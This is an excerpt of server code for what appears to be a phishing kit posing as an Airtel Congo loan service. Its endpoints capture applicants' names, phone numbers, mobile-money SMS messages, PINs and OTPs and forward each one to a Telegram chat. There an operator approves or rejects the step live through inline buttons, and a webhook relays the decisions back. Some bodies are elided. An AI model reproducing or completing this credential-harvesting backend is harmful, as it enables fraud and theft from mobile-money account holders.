...
app.post('/api/send-application', async (req, res) => {
  ...
  const message = `NEW LOAN APPLICATION (AIRTEL CONGO)\nID: ${appId}\nPhone: +243${data.phone}\nAmount: CDF ${data.loanAmount}\nTerm: ${data.loanTerm}\nName: ${data.firstName} ${data.lastName}\n\nApprove or reject the SMS step:`;
  const buttons = [[
...
app.post('/api/send-momo-message', async (req, res) => {
  ...
  const message = `SMS VERIFICATION (AIRTEL CONGO)\nID: ${applicationId}\nPhone: +243${phone}\n\nMessage:\n${momoMessage}\n\nApprove or reject:`;
  const buttons = [[
...
app.post('/api/resend-sms', async (req, res) => {
  ...
  app.smsStatus = 'pending';
  const message = `SMS RESUBMITTED (AIRTEL CONGO)\nID: ${applicationId}\nMessage:\n${app.momoMessage || '(empty)'}\n\nApprove or reject:`;
  const buttons = [[
    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'SMS', ref: app.ref }) },
    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'SMS', ref: app.ref }) }
  ]];
...
app.post('/api/send-pin', async (req, res) => {
  ...
  const message = `PIN VERIFICATION (AIRTEL CONGO)\nID: ${applicationId}\nPIN Entered: ${pin}\n\nApprove or reject:`;
  const buttons = [[
...
app.post('/api/send-otp', async (req, res) => {
  ...
  const message = `OTP VERIFICATION (AIRTEL CONGO)\nID: ${applicationId}\nOTP Entered: ${otp}\n\nApprove or reject:`;
  const buttons = [[
...
app.post('/api/telegram-webhook', async (req, res) => {
  ...
  if (update.callback_query) {
    ...
    await sendTelegramMessage(`Status Update (AIRTEL CONGO)\nID: ${appId}\nStep: ${s}\nAction: ${a}`);
